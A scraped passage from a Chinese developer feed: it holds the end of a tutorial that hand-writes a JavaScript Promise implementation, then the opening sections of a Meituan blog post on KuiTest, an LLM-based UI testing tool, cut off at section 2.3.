                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">onRejected</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span>);
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, x, resolve, reject);
                    } <span class="hljs-keyword">catch</span> (error) {
                        <span class="hljs-title function_">reject</span>(error);
                    }
                }, <span class="hljs-number">0</span>);
            };

            <span class="hljs-comment">// 根据当前状态处理</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'fulfilled'</span>) {
                <span class="hljs-title function_">handleResolved</span>();
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'rejected'</span>) {
                <span class="hljs-title function_">handleRejected</span>();
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'pending'</span>) {
                <span class="hljs-comment">// 如果是pending状态，将回调函数存储起来</span>
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleResolved</span>());
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleRejected</span>());
            }
        });

        <span class="hljs-keyword">return</span> promise2;
    }

    <span class="hljs-comment">// 处理Promise解析过程</span>
    <span class="hljs-title function_">resolvePromise</span>(<span class="hljs-params">promise2, x, resolve, reject</span>) {
        <span class="hljs-comment">// 防止循环引用</span>
        <span class="hljs-keyword">if</span> (promise2 === x) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Chaining cycle detected for promise'</span>));
        }

        <span class="hljs-comment">// 标记是否已被调用，防止多次调用</span>
        <span class="hljs-keyword">let</span> called = <span class="hljs-literal">false</span>;

        <span class="hljs-keyword">if</span> (x !== <span class="hljs-literal">null</span> &amp;&amp; (<span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'function'</span>)) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 获取then方法</span>
                <span class="hljs-keyword">const</span> then = x.<span class="hljs-property">then</span>;

                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> then === <span class="hljs-string">'function'</span>) {
                    <span class="hljs-comment">// 如果x有then方法，则将其视为Promise</span>
                    then.<span class="hljs-title function_">call</span>(
                        x,
                        <span class="hljs-comment">// resolvePromise</span>
                        <span class="hljs-function"><span class="hljs-params">y</span> =&gt;</span> {
                            <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                            called = <span class="hljs-literal">true</span>;
                            <span class="hljs-comment">// 递归解析</span>
                            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, y, resolve, reject);
                        },
                        <span class="hljs-comment">// rejectPromise</span>
                        <span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> {
                            <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                            called = <span class="hljs-literal">true</span>;
                            <span class="hljs-title function_">reject</span>(r);
                        }
                    );
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// 如果x是普通对象或函数，直接resolve</span>
                    <span class="hljs-title function_">resolve</span>(x);
                }
            } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                called = <span class="hljs-literal">true</span>;
                <span class="hljs-title function_">reject</span>(error);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 如果x是基本类型，直接resolve</span>
            <span class="hljs-title function_">resolve</span>(x);
        }
    }

    <span class="hljs-comment">// catch方法接收一个参数onRejected</span>
    <span class="hljs-keyword">catch</span>(onRejected) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>(<span class="hljs-literal">null</span>, onRejected);
    }

    <span class="hljs-comment">// finally方法接收一个参数onFinally</span>
    <span class="hljs-title function_">finally</span>(<span class="hljs-params">onFinally</span>) {
        <span class="hljs-comment">// 需要先检查 onFinally 是否为函数</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> onFinally !== <span class="hljs-string">'function'</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>(
            <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFinally</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> value),
            <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFinally</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-keyword">throw</span> reason })
        );
    }

    <span class="hljs-comment">// Promise静态方法resolve</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-params">value</span>) {
        <span class="hljs-comment">// 如果已经是Promise实例，直接返回</span>
        <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Promise</span>) {
            <span class="hljs-keyword">return</span> value;
        }

        <span class="hljs-comment">// 普通值</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
            <span class="hljs-title function_">resolve</span>(value);
        });
    }

    <span class="hljs-comment">// Promise静态方法reject</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">reject</span>(<span class="hljs-params">reason</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> {
            <span class="hljs-title function_">reject</span>(reason);
        });
    }

    <span class="hljs-comment">// Promise静态方法all</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">all</span>(<span class="hljs-params">promises</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'参数必须是数组'</span>));
            }

            <span class="hljs-keyword">const</span> results = [];
            <span class="hljs-keyword">let</span> completedCount = <span class="hljs-number">0</span>;

            promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
                <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                    <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
                        results[index] = value;
                        completedCount++;

                        <span class="hljs-keyword">if</span> (completedCount === promises.<span class="hljs-property">length</span>) {
                            <span class="hljs-title function_">resolve</span>(results);
                        }
                    },
                    reject  <span class="hljs-comment">// 直接传递reject函数</span>
                );
            });
        });
    }

    <span class="hljs-comment">// Promise静态方法race</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">race</span>(<span class="hljs-params">promises</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'参数必须是数组'</span>));
            }

            promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">promise</span> =&gt;</span> {
                <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(resolve, reject);
            });
        });
    }

    <span class="hljs-comment">// Promise静态方法allSettled</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">allSettled</span>(<span class="hljs-params">promises</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'参数必须是数组'</span>));
            }

            <span class="hljs-keyword">const</span> results = [];
            <span class="hljs-keyword">let</span> completedCount = <span class="hljs-number">0</span>;

            <span class="hljs-keyword">const</span> <span class="hljs-title function_">processResult</span> = (<span class="hljs-params">index, value, status</span>) =&gt; {
                results[index] = status === <span class="hljs-string">'fulfilled'</span>
                    ? { <span class="hljs-attr">status</span>: <span class="hljs-string">'fulfilled'</span>, value }
                    : { <span class="hljs-attr">status</span>: <span class="hljs-string">'rejected'</span>, <span class="hljs-attr">reason</span>: value };

                completedCount++;

                <span class="hljs-keyword">if</span> (completedCount === promises.<span class="hljs-property">length</span>) {
                    <span class="hljs-title function_">resolve</span>(results);
                }
            };

            promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
                <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                    <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-title function_">processResult</span>(index, value, <span class="hljs-string">'fulfilled'</span>),
                    <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> <span class="hljs-title function_">processResult</span>(index, reason, <span class="hljs-string">'rejected'</span>)
                );
            });
        });
    }


    <span class="hljs-comment">// Promise静态方法any</span>
    <span class="hljs-keyword">static</span> <span class="hljs-title function_">any</span>(<span class="hljs-params">promises</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'参数必须是数组'</span>));
            }

            <span class="hljs-keyword">const</span> errors = [];
            <span class="hljs-keyword">let</span> rejectedCount = <span class="hljs-number">0</span>;

            promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
                <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                    <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
                        <span class="hljs-title function_">resolve</span>(value);
                    },
                    <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> {
                        errors[index] = reason;
                        rejectedCount++;
                        <span class="hljs-keyword">if</span> (rejectedCount === promises.<span class="hljs-property">length</span>) {
                            <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AggregateError</span>(errors, <span class="hljs-string">'所有Promise都被拒绝'</span>));
                        }
                    }
                );
            });
        });
    }
}

</code></pre>
<h2 data-id="heading-30">结语</h2>
<p>本文通过手写实现Promise，深入理解了Promise的工作原理，掌握了异步编程的核心思想。虽然实际的Promise实现更为复杂（考虑更多边界情况和性能优化），但本文的实现已经涵盖了Promise的核心功能。对于文章中错误的地方或者有任何问题，欢迎在评论区留言讨论！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[KuiTest：基于大模型通识的UI交互遍历测试]]></title>    <link>https://juejin.cn/post/7594398051721478182</link>    <guid>https://juejin.cn/post/7594398051721478182</guid>    <pubDate>2026-01-13T02:26:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594398051721478182" data-draft-id="7594398051721429030" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="KuiTest：基于大模型通识的UI交互遍历测试"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-13T02:26:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="美团技术团队"/> <meta itemprop="url" content="https://juejin.cn/user/3509296845313741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            KuiTest：基于大模型通识的UI交互遍历测试
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47ccb42d726640a7889ba1e64ae203e6~tplv-k3u1fbpfcp-watermark.image" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="美团技术团队" class="title" data-v-d326b38e="">美团技术团队</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2026-01-13T02:26:01.000Z" title="Tue Jan 13 2026 02:26:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2026-01-13
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                阅读16分钟
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        关注
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              美团小编 @美团
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>美团质效技术部联合复旦大学周扬帆教授团队推出KuiTest——零规则UI功能性异常测试工具。KuiTest通过将“人类预期”直接用作Test Oracle，解决了长期以来UI测试Oracle泛化性差的自动化痛点。实验表明，KuiTest异常召回率达86%，误报率仅1.2%，已在执行21万+测试用例，发现百余例有效缺陷，大幅降低人工成本并提升测试覆盖率。</p>
</blockquote>
<h2 data-id="heading-0">1 背景</h2>
<p>近来，随着 App 的功能愈发复杂，UI（用户界面）的交互逻辑也随之多样化。为了保障用户体验，针对 UI 的功能测试一直是质量保障中的重要环节。传统的 UI 功能测试往往依赖于人工编写的测试脚本或规则体系：通过手动编写校验逻辑来验证交互是否正确。这种方式虽然精确，但成本高昂，维护困难。</p>
<p>对美团而言， 一个 App 就有可能包含上千种 UI 界面、数万个交互操作。随着业务快速迭代、界面频繁调整、底层平台（如 Android、iOS、HarmonyOS NEXT）的更新，基于规则的测试脚本常常失效。每当脚本失效，测试工程师都需要花费大量时间重新绑定元素、修复规则脚本，极大地提升了测试自动化的开销。此外，当下的 UI 功能缺陷通常并不表现为崩溃，而是更复杂的响应逻辑异常：例如图 1 中点击“全部已读”却清空了消息列表等。这类问题严重影响用户体验，但难以通过简单规则概括，限制了传统 UI 测试自动化的覆盖率与效率。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b23ed847322437083a1b5b0984ce3ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=M8ThfQEeq7MkG6rDf9HIGR0UwLo%3D" alt="图 1 - UI 功能响应异常示例" loading="lazy"/></p>
<p>考虑到 UI 功能缺陷虽表现各异，但共性是 App 的响应偏离用户预期。因此，若能实现对用户预期的模拟，就能以此作为测试准则（Oracle）、自动化的检测 UI 功能性异常。即无需人工逐页面编写规则，从而大幅提升自动化的程度与测试覆盖率。由于大语言模型（LLM）经过海量通用知识训练，具备一定的模拟人类常识与预期的能力，恰好契合模拟用户预期的需求，且无需针对特定应用 / 功能单独适配，天然具备泛化性。因此，通过分析 UI 功能缺陷的共性，我们提出了一个全新的思路：<strong>能否基于大模型理解“人类对 UI 交互的常识预期”，并以此自动判断交互是否正确？</strong></p>
<p>基于这一理念，我们与复旦大学计算与智能创新学院 <a href="https://link.juejin.cn?target=http%3A%2F%2Fy-droid.com%2Fyz%2F" target="_blank" title="http://y-droid.com/yz/" ref="nofollow noopener noreferrer">周扬帆教授团队</a> 展开联合研究，设计并实现了 <strong>KuiTest</strong> —— 一套基于 <strong>大众通识</strong> 的 <strong>无规则（Rule-free）UI 功能测试系统</strong>。KuiTest 能够像人一样，理解按钮、图标等交互组件的含义，预测点击后的合理结果，并据此自动校验实际界面反馈是否符合预期，从而在无需手工脚本的情况下完成功能测试。该工作已在美团 App 的多个业务中落地应用，并产出论文《<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.computer.org%2Fcsdl%2Fproceedings-article%2Ficse-seip%2F2025%2F368500a034" target="_blank" title="https://www.computer.org/csdl/proceedings-article/icse-seip/2025/368500a034" ref="nofollow noopener noreferrer">KuiTest: Leveraging Knowledge in the Wild as GUI Testing Oracle for Mobile Apps</a>》，已被国际顶级软件工程会议 ICSE 2025（CCF-A 类会议）的 Software In Practice Track（软件工程应用实践）收录。</p>
<h2 data-id="heading-1">2. 设计思路与实现过程</h2>
<h3 data-id="heading-2">2.1 总体流程</h3>
<p>KuiTest 的核心是检查 UI 交互后的响应是否符合一般用户的 <strong>常识性预期</strong>，其中：识别交互组件的功能和常识性预期生成是需要两项关键能力。考虑到通用大模型具备图文理解能力且从海量的训练数据中习得了常识性推理能力，因此天然地适合模拟大众的认知和交互预期。至此，KuiTest 的核心挑战是提升大模型在执行 UI 功能测试的 <strong>性能和可靠性</strong>。考虑到通用大模型通常并未接受过 UI 测试领域数据的训练，因此缺少 UI 认知与测试的经验，直接让它识别 UI 功能和缺陷是十分困难的。所以我们借鉴人工测试的操作流程，将测试流程拆分以降低 LLM 的任务难度：</p>
<ul>
<li><strong>可交互组件功能识别</strong>：理解每个可交互组件（如按钮、图标）的功能含义、预测交互后的响应。</li>
<li><strong>交互响应验证</strong>：在执行交互后，验证界面响应是否符合预期。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b8f3326aec7416f8e2d950d131fd383~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=Cg2SRr7wm%2BqbPkSlio4MgoF6H6o%3D" alt="图 2 - KuiTest 工作原理" loading="lazy"/></p>
<p>具体来说，如上图 2 所示，在测试开始时，首先选择需要交互的组件，KuiTest 会基于 GUI 截图分析和组件库匹配获取该组件的功能，并预测与之交互后的 UI 响应；随后执行交互，根据组件的预期功能以及交互后的页面信息判断实际响应是否符合预期。</p>
<h3 data-id="heading-3">2.2 UI 组件功能识别</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/617d2b8fa3954e82ac3e7b02530b2efd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=bumBPkkQGZ1osAveqSJDQC6i6pE%3D" alt="图 3 - 可交互组件功能识别与 UI 响应预测" loading="lazy"/></p>
<p>为了提升大模型预测 UI 组件功能的可靠性，KuiTest 整合了多种 UI 页面相关信息输入：首先，我们获取结构化组件树并结合 Vision-UI 模型<sup>[1]</sup>从截图中识别所有可交互组件，再用 SoM（Set-of-Mark）策略<sup>[2]</sup>为每个组件添加 bounding box 标记并分配唯一 ID，形成带标记的 UI 截图，让大模型能快速分辨图中存在的 UI 组件。接着，针对有文本的组件，通过 OCR 提取文字内容并按“组件 ID - 文本”结构化整理；针对无文本的图标类组件，则利用 CLIP（Contrastive Language–Image Pre-training）模型<sup>[3]</sup>从积累的图标库（含历史识别失败图标及人工标注的功能描述）中检索相似图标，如果存在相似图标，则将库中图标的功能信息补充至输入来辅助大模型理解组件。最后，将上述所有信息整合进 Prompt，让大模型识别指定组件的功能，并预测交互后 UI 界面的响应。这一过程有效缓解了通用多模态大模型 UI 视觉信息理解薄弱的瓶颈，并为后续交互验证提供 Oracle。</p>
<h3 data-id="heading-4">2.3 交互响应验证</h3>
